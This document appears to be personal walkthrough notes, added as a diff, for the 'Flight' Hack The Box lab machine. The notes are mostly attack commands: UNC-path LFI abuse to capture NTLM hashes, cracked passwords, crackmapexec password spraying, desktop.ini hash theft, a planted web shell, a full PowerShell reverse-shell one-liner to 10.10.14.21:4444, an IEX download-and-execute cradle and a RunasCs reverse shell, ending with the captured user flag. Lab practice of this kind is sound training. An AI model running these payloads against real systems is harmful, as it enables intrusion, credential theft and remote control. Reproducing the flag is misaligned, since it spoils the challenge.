@@ -1,0 +1,46 @@
+flight.htb website has no leads, but a simple wfuzz on the domain, gave us
+school.flight.htb
+
+looking into school.flight, there is a LFI, but with a trick
+This LFI doesnt allow actual file read ability, instead, using the
+Windows Network Share syntax //IP/share we can set up a responder
+that will give us the NTML hash for the svc_apache user
+
+svc_apache:S@Ss!K@*t13
+
+We can use these creds to access the SMB Shares
+
+After gaining creds we can enum all the SMB users using crackmapexec:
+crackmapexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --users
+
+after we can password spray to find any users with the same password:
+crackmapexec smb 10.10.11.187 -u smbUserList.txt -p 'S@Ss!K@*t13' --continue-on-success
+
+S.Moon - shares svc's passwd
+
+Using impacket for more enumeration, we see from:
+impacket-psexec flight.htb/s.moon@flight.htb
+
+That Shared is writable
+
+We can attempt to steal more hashes by building a fake .ini:
+https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini
+
+C.Bum:Tikkycoll_431012284
+
+We can add a Web Shell into the flight.htb web directory to access in the browser
+
+Rev PS Command:
+	powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.21',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+
+Then from the browser we can establish a power shell rev shell on NC
+
+To esc to C.Bum, we need to use RunasCS : https://github.com/antonioCoco/RunasCs/tree/master
+
+Download Command:
+	powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.21:80/runaTest.ps1')
+
+.\runacs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.14.21:4444
+
+Get-Content user.txt -> Read File Contents
+user:52c1593427b4115953e372d49333045f
